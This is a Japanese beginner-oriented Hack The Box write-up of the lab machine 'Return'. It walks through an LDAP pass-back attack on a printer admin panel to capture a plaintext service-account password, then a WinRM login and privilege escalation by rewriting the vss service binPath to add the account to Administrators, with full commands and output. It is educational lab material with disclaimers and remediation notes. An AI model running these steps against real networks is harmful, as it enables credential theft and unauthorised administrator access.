---
title: "[ HTB ] Return | Writeup"
emoji: "🖨️"
type: "tech"
topics: ["Security", "writeup", "Cyber Security", "hacking", "Hack The Box"]
published: false
---

## README

- 初学者の、初学者による、初学者のためのWriteupです。
- 「なぜその判断に至ったのか」「なぜそのコマンドを実行しようと考えたのか」など、各アクションに至った思考回路部分についても触れています。
- 尚、一部正確でない表現が含まれている場合があります。
- 一応実務でもペネトレーションテストをやっているので、（たまに）実務目線のコメントも挟みます。

### 想定読者

- HTBなどのCTF/ペネトレーションテスト演習に興味がある初学者
- Linuxの基本的なコマンド操作、HTTP/SMB/LDAP/WinRMなどのプロトコルについてある程度の前提知識がある方(本記事内でも簡単な用語解説を挟んでいます)

## Machine Profile

Machine Name: Return
Difficulty: Easy
OS: Windows

https://app.hackthebox.com/machines/Return

## Setup

対象IPを`RHOSTS`という環境変数に入れておく。IP手打ちなどによるミスを防止

```sh
┌──(root㉿5602a1b7889d)-[~/Return]
└─# echo 'export RHOSTS="10.129.95.241"' | tee -a .zshrc
export RHOSTS="10.129.95.241"
```

設定反映

```sh
┌──(root㉿5602a1b7889d)-[~/Return]
└─# source .zshrc
```

動作確認＆疎通確認

```sh
┌──(root㉿5602a1b7889d)-[~/Return]
└─# ping -c 4 ${RHOSTS}
PING 10.129.95.241 (10.129.95.241) 56(84) bytes of data.
64 bytes from 10.129.95.241: icmp_seq=1 ttl=127 time=460 ms
64 bytes from 10.129.95.241: icmp_seq=2 ttl=127 time=458 ms
64 bytes from 10.129.95.241: icmp_seq=3 ttl=127 time=461 ms
64 bytes from 10.129.95.241: icmp_seq=4 ttl=127 time=459 ms

--- 10.129.95.241 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 458.123/459.521/461.044/1.102 ms
```

`ttl=127`なので、間にルータ(HTBのVPNゲートウェイ)を1つ挟んだWindows機(初期TTL=128)だろう、という当たりが付く。

## Enumeration

### Nmap

まずはNmapでポートスキャン、兎にも角にもNmap。

```sh
┌──(root㉿5602a1b7889d)-[~/Return]
└─# nmap -sSV -Pn -n -T4 -oN nmap_version.txt ${RHOSTS}
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-15 21:40 +0900
Nmap scan report for 10.129.95.241
Host is up (0.46s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-17 11:42:15Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.02 seconds
```

`-sSV`: SYNスキャン＋Versionスキャン  
`-Pn`: Pingチェック無効化  
デフォルトだとPingが通らないとスキャンが始まらないが、このチェックを省略し若干の時短を図る  
`-n`: 名前解決無効化。同じく時短目的  
`-T4`: 並列スキャン数増加。未指定時はデフォルトの3が選択される、時短  
`-oN`: 結果を保存するファイル名を指定  

---

53/88/135/139/389/445/464/3268...と、Active DirectoryのDCでお馴染みのポートが一通り開いている。ホスト名は`PRINTER`、ドメインは`return.local`。

> 80/tcp   open  http          Microsoft IIS httpd 10.0
> 5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

DCにしては珍しく、80番でIISのWebが上がっていて、5985番(WinRM)も開いている。ADのEnumerationはLDAP/SMB/Kerberosから崩すのが定番だが、今回は「DC上でわざわざWebが公開されている」のが明らかに不自然なので、まずは80番のWebを見にいくことにする。

:::details WinRM(5985)が開いていることの意味
読み方: ウィンアールエム

正式名称: Windows Remote Management

意味: WindowsをSSHライクに遠隔管理するためのプロトコル。これが開いているということは、何らかのクレデンシャルさえ手に入れば(かつそのユーザが`Remote Management Users`相当の権限を持っていれば)、そのまま対話シェルを取れる可能性が高い。「どこかでIDとPWを拾う → 5985経由でログイン」という出口が最初から見えている状態。
:::

### Web(IIS)

> 80/tcp   open  http          Microsoft IIS httpd 10.0

ブラウザで`http://${RHOSTS}/`にアクセスすると、`HTB Printer Admin Panel`というネットワークプリンタの管理画面が表示される。ナビゲーションの`Settings`(`/settings.php`)を開くと、プリンタがADに問い合わせるためのLDAP接続設定フォームが置いてあった。

![settings.phpのLDAP設定フォーム。Server Addressにprinter.return.local、Portに389、Usernameにsvc-printer、Passwordがマスク表示されている](/images/return-printer-settings.png)

フォームの中身はこうなっている。

```:settings.phpのLDAP設定
Server Address : printer.return.local
Server Port    : 389
Username       : svc-printer
Password       : ●●●●●●● (マスク表示)
```

Server Addressに`printer.return.local`、Portに`389`(LDAP)、Usernameにサービスアカウントらしき`svc-printer`が入っている。PWはドット表示でマスクされているが、ここで「じゃあこのプリンタは、保存されたクレデンシャルを使ってServer Addressで指定された先にLDAP接続しにいくんだな」という挙動が想像できる。

:::details なぜこのフォームが“おいしい”と分かるのか
複合機(MFP)やネットワークプリンタは、スキャンしたファイルをユーザのフォルダに保存したり、宛先をアドレス帳から引いたりするために、ADのLDAPへ問い合わせる機能を持っていることが多い。その認証用のID/PWが、この手の管理画面に平文で保存されている。

ポイントは「接続先サーバ(Server Address)を管理画面から自由に書き換えられる」こと。接続先を攻撃者のマシンに向けてやれば、プリンタは保存済みのクレデンシャルを“攻撃者のサーバ”に向かって送りつけてくる。これがいわゆる LDAP Pass-back Attack(認証情報の送り先すり替え)で、プリンタ系マシンの定番ルート。
:::

## Foothold

### LDAP Pass-back でクレデンシャルを奪取

:::details LDAP Pass-back Attackとは？
読み方: エルダップ・パスバック・アタック

意味: プリンタや複合機などの「外部ディレクトリ(LDAP/AD)に接続する機能」を持つデバイスで、接続先サーバのアドレスを攻撃者が指定できる場合に成立する攻撃。デバイスは設定された接続先に対して、保存済みのクレデンシャルを使って認証しにいく。接続先を攻撃者のリスナーに向けておくと、本来は暗号化・マスクされているはずのPWが平文のまま飛んでくる。
:::

:::details LDAPとは？
読み方: エルダップ

正式名称: Lightweight Directory Access Protocol

意味: ディレクトリサービスに対し検索・参照などの諸々のやり取りをする際に使用するプロトコル/サービス。Windows環境ならActive Directory(AD)が主流で、標準の平文LDAPはTCP 389番を使う。
:::

やることはシンプルで、攻撃者側の389番で待ち受けておき、フォームのServer Addressを自分のIP(tun0)に書き換えて`Update`を押すだけ。プリンタがこちらに認証しにきた瞬間、平文のPWがリスナーに流れてくる。

まずは`nc`で389番を開けて待ち受ける。

```sh
┌──(root㉿5602a1b7889d)-[~/Return]
└─# nc -lnvp 389
listening on [any] 389 ...
```

`-l`: リッスンモード  
`-n`: 名前解決しない  
`-v`: 詳細表示  
`-p 389`: 待ち受けポート指定  

この状態で、`/settings.php`のServer Addressを自分のVPN(tun0)のIPに変更し`Update`を実行する。すると先ほどのリスナーに接続が来て、クレデンシャルが落ちてくる。

```sh
┌──(root㉿5602a1b7889d)-[~/Return]
└─# nc -lnvp 389
listening on [any] 389 ...
connect to [10.10.16.125] from (UNKNOWN) [10.129.95.241] 49721
0*`%return\svc-printer
                       1edFg43012!!
```

> return\svc-printer
> 1edFg43012!!

先頭に制御文字が混じっているが、`return\svc-printer` というアカウント名と、平文PW `1edFg43012!!` がはっきり読み取れる。フォームでマスクされていたPWが、送り先を変えるだけであっさり平文で取れてしまった。

```txt:creds.txt
svc-printer:1edFg43012!!
```

### クレデンシャルの検証 → WinRM ログイン

拾ったクレデンシャルが本当に通るか、まずは`nxc`[^1]で確認する。

:::details nxcとは？
読み方: ネットエクスキュート

正式名称: NetExec

意味: SMB/LDAP/WinRMなどのプロトコルに対し認証試行・情報列挙・コマンド実行をいい感じにやってくれるツール群。`CrackMapExec`の後継。末尾に`(Pwn3d!)`が出れば「そのプロトコルで刺さる(≒管理操作ができる)」という合図。
:::

```sh
┌──(root㉿5602a1b7889d)-[~/Return]
└─# nxc ldap 10.129.95.241 -u svc-printer -p '1edFg43012!!'
LDAP        10.129.95.241   389    PRINTER          [*] Windows 10 / Server 2019 Build 17763 (name:PRINTER) (domain:return.local) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.95.241   389    PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
```

> [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)

末尾`[+]`＋`(Pwn3d!)`で、クレデンシャルが有効であることが確認できた。Nmapで5985(WinRM)が開いていたので、そのまま`evil-winrm`[^2]で対話シェルを狙う。

:::details evil-winrmとは？
読み方: イービル・ウィンアールエム

意味: WinRM経由でWindowsマシンに対話シェルを張るためのツール。ファイルのアップロード/ダウンロードも1コマンドで出来るので攻撃者視点では便利。
:::

```sh
┌──(root㉿5602a1b7889d)-[~/Return]
└─# evil-winrm -i 10.129.95.241 -u svc-printer -p '1edFg43012!!'

Evil-WinRM shell v3.9
...
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami
return\svc-printer
```

`whoami`が`return\svc-printer`を返し、無事にシェルを掌握。デスクトップを見るとフラグがあるので取得する。

```sh
*Evil-WinRM* PS C:\Users\svc-printer\Documents> cd ..\desktop
*Evil-WinRM* PS C:\Users\svc-printer\desktop> dir


    Directory: C:\Users\svc-printer\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/17/2026   4:40 AM             34 user.txt

*Evil-WinRM* PS C:\Users\svc-printer\desktop> type user.txt
```

:::message
プリンタ管理画面に平文で保存されたLDAP用クレデンシャルを、接続先サーバを攻撃者側にすり替えること(LDAP Pass-back)で平文のまま奪取出来た。原因は「デバイスの接続先を認証なしで変更できる設計」と「サービスアカウントのクレデンシャルを低権限の管理画面に保持していた」こと。カテゴリとしては設定不備＋認証情報の不適切な管理にあたる。
:::

## Privilege Escalation

### 所属グループの確認

いつもなら横展開先を探すところだが、今回は`svc-printer`自身の権限を見た時点で昇格ルートが見えたので、横展開なしで直接SYSTEMを狙う形になった。まずは自分の所属グループを確認する。

```sh
*Evil-WinRM* PS C:\Users\svc-printer\Documents> net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
...
Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.
```

> Local Group Memberships      *Print Operators      *Remote Management Use
>                              *Server Operators

`Server Operators`に所属している。これが今回の昇格の肝。

:::details Server Operatorsグループとは？
読み方: サーバーオペレーターズ

意味: ドメインコントローラ上のサーバを管理するための組み込みグループ。メンバーはDC上で「サービスの起動/停止/設定変更」「ローカルログオン」「バックアップ/リストア」などが出来る。

一見“運用担当者向け”だが、サービスの設定変更権限(`SERVICE_CHANGE_CONFIG`)を持つのが危険。多くのWindowsサービスは`LocalSystem`(= `NT AUTHORITY\SYSTEM`)で動くため、サービスの実行バイナリを自分の好きなコマンドに差し替えて起動すれば、そのコマンドがSYSTEM権限で走ってしまう。実質的にSYSTEMへの昇格経路になる。
:::

### サービスの binPath を書き換えて SYSTEM 権限でコマンド実行

攻撃の筋道はこう。

1. `LocalSystem`で動く適当なサービスの実行パス(binPath)を、任意コマンドに書き換える
2. そのサービスを起動して、書き換えたコマンドをSYSTEM権限で1回実行させる
3. 実行させるコマンドは「`svc-printer`を`Administrators`に追加する」にする

リバースシェルを飛ばす手もあるが、今回は一発完結する`net localgroup ... /add`を選ぶ。一瞬で終わるコマンドなので、後述のサービスのタイムアウト問題に引っかからず確実だし、ファイルのアップロードも不要で済む。

:::details binPathにコマンドを書けるのはなぜ？
`sc config <svc> binPath=` に書き込むのは、サービス起動時にOSが`CreateProcess`に渡す「実行ファイルのパス＋引数」のコマンドライン。ファイルパス限定ではなく引数まで書けるので、実行ファイルを`cmd.exe`にして`cmd /c <任意コマンド>`の形にすれば、任意コマンドを実行させられる。`cmd.exe`はWindows標準なので持ち込み不要。

ただしパイプやリダイレクトはシェル機能なので、使いたい場合は`cmd /c "..."`で包む必要がある。
:::

今回は`vss`(Volume Shadow Copy)サービスを使う。`LocalSystem`で動き、普段は停止していて、止めたり壊したりしても実害がほぼないため、この手の悪用で選ばれやすい無害なサービス。

:::details なぜ狙うのが vss なのか
`vss`に特別な意味はなく、「`LocalSystem`で動く／普段停止している／再起動しても実害が少ない」という条件を満たすサービスの一例というだけ。逆に`Spooler`や`WinRM`のような常時稼働の重要サービスを乗っ取ると、接続断やマシンの不安定化を招く(自分のevil-winrm接続を切ってしまう恐れもある)ので避ける。`vss`は“安全に使い捨てできるSYSTEMサービス”なので定番になっている。
:::

`svc-printer`を`Administrators`に追加するコマンドでbinPathを上書きする。

```sh
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> sc.exe config vss binPath="cmd /c net localgroup Administrators svc-printer /add"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> sc.exe start vss
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

> [SC] StartService FAILED 1053:
> The service did not respond to the start or control request in a timely fashion.

`StartService FAILED 1053`とエラーが出ているが、これは想定どおりなので慌てない。

:::details 1053エラーが出ても成功している理由
サービスとして起動されたプロセスは、本来OSのサービス制御マネージャ(SCM)に対して「開始したよ」と状態報告をする必要がある。今回仕込んだ`cmd /c net localgroup ...`はサービスとして振る舞わないので報告を返さず、SCMは約30秒待って「起動失敗(1053)」と判断する。

ただし“起動失敗”はあくまでSCMからの見え方で、仕込んだコマンド自体はプロセスとして一度起動・実行される。`net localgroup ... /add`は一瞬で完了するので、SCMがタイムアウトでkillするより先に処理が終わっており、エラー表示とは裏腹に`Administrators`への追加は成功している。
:::

### 管理者権限の確認 → root.txt

グループ追加はログオンセッションのトークンには即時反映されないため、`evil-winrm`で接続し直して(トークンを貼り直して)から所属を再確認する。

```sh
┌──(root㉿5602a1b7889d)-[~/Return]
└─# evil-winrm -i 10.129.95.241 -u svc-printer -p '1edFg43012!!'

Evil-WinRM shell v3.9
...
*Evil-WinRM* PS C:\Users\svc-printer\Documents> net user svc-printer
...
Local Group Memberships      *Administrators       *Print Operators
                             *Remote Management Use*Server Operators
Global Group memberships     *Domain Users
The command completed successfully.
```

> Local Group Memberships      *Administrators       *Print Operators

`Administrators`が追加されている。これでローカル管理者相当の権限を得たので、`Administrator`のデスクトップから`root.txt`を取得する。

```sh
*Evil-WinRM* PS C:\Users\svc-printer\Documents> cd C:\Users\Administrator\Desktop\
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/17/2026   4:40 AM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```

`Administrator\Desktop`配下の`root.txt`に到達でき、攻略完了。

:::message
`Server Operators`グループが持つサービス設定変更権限を悪用し、`LocalSystem`で動くサービスのbinPathを任意コマンドに書き換えて`Administrators`グループへ自分を追加した。原因は「サービスアカウントに`Server Operators`という過剰な権限を与えていた」こと。カテゴリとしては過剰な権限付与(権限設計の不備)にあたる。
:::

## まとめ

1. Nmapで、DCのポート群に加えて80(IIS)と5985(WinRM)が開いていることを確認
2. 80番の`HTB Printer Admin Panel`(`/settings.php`)に、`svc-printer`のLDAPクレデンシャルがマスク保存されているのを発見
3. 攻撃者側で389番を待ち受け、フォームのServer Addressを自分のIPに書き換えてLDAP Pass-backを成立させ、平文PW(`1edFg43012!!`)を奪取
4. `nxc`でクレデンシャルの有効性を確認し、`evil-winrm`で`svc-printer`としてログイン(user.txt)
5. `svc-printer`が`Server Operators`に所属していることを確認
6. `sc config`で`vss`サービスのbinPathを`net localgroup Administrators svc-printer /add`に書き換え、サービス起動でSYSTEM権限のコマンドを実行
7. 再ログインして`Administrators`追加を確認し、`Administrator\Desktop`の`root.txt`を取得

プリンタ管理画面のPass-backでクレデンシャルを抜き、`Server Operators`のサービス権限でSYSTEMへ、という2段構成。どちらも「設定/権限の与えすぎ」が根っこにある、現場でもありがちな構図で、Easyながら学びの多いマシンだった。
特に、リバースシェルを飛ばさずに`net localgroup`の一発コマンドで昇格を済ませると、サービスのタイムアウト(1053)やシェル切断に振り回されずに済むのがスマートで気持ちよかった。

ちなみにHTBなのでやらないですが、実務では後始末(binPathの原状復帰や、追加したグループメンバーシップの削除など)もやっています。

## 免責事項

- 本記事はセキュリティ学習・知識共有を目的としています。
- 記載しているコマンド・攻撃手法は、自分が管理する環境、または明示的に許可を得た環境でのみ実行してください。他者の環境に無断で使用した場合、不正アクセス禁止法などの法令に抵触する可能性があります。
- 本記事の内容によって生じたいかなる損害についても、筆者は責任を負いかねます。

## HTBのポリシーについて

Hack The Boxでは、Retired状態のマシンに限りWriteupの公開が認められています。Activeなマシンの解法を公開する行為は利用規約違反にあたるため、本記事の対象マシンは執筆時点でRetiredであることを確認しています。

[^1]: https://github.com/Pennyw0rth/NetExec
[^2]: https://github.com/Hackplayers/evil-winrm
